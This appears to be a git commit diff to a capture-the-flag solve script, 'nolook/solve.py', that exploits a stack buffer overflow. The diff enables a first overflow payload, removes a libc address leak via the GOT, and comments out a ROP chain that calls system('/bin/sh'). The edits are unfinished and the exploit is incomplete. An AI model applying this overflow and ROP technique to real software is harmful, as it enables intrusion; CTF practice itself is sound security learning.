757fd633903aa1428d0009fa6092b56e2efb8eaa
Xernary <nicolalggiuffrida@gmail.com>
2024-05-06 18:35:05 +0200

    idk

--- sw/nolook/solve.py
+++ sw/nolook/solve.py
@@ -38,18 +38,13 @@ def main():
    # payload = b'a'*25 + p64(exe.plt["read"], endianness = 'little') # p32(0x00000000004005a7) + b' '+  read_addr
 
    # # first cycle
-   # payload = b'a'*24 + p64(0x004005b7)
-   # r.send(payload)
-   # print("FIRST CYCLE DONE")
+    payload = b'a'*24 + p64(0x004005b7)
+    r.send(payload)
+    print("FIRST CYCLE DONE")
 
     # leak got.read addr
-    read_got_addr = exe.got.read
-    read_libc_addr = libc.symbols["read"]
-    print(b'read_got_addr after: ' + hexlify(p64(read_got_addr, endianness = 'little')))
-    print('libc before: ' + str(libc.address))
-    libc.address = read_got_addr - read_libc_addr
-    print('libc after: ' + str(libc.address))
-    print('plt.read: ' + str(exe.plt.read))
+
+
 
    # shell_string_addr = 0x1b3e9a + libc.address
    # system_addr = 0x000000000004f440 + libc.address
@@ -58,7 +53,7 @@ def main():
    # print(b'system_addr :' + p64(0x000000000004f440 + libc.address)) #0x5403E8
 
     # second cycle      # pop rdi; ret;              # "/bin/sh"                
-    payload = b'a'*24 + p64(libc.address + 834795) + p64(libc.address + 136543) + p64(libc.address + 1785498) + p64(libc.address + 324672) #+ p64(0x6A4E42)  #p64(0x004005b7)
+    payload = b'a'*24 #+ p64(libc.address + 834795) + p64(libc.address + 136543) + p64(libc.address + 1785498) + p64(libc.address + 324672) #+ p64(0x6A4E42)  #p64(0x004005b7)
     r.send(payload)
     print("SECOND CYCLE DONE")
 
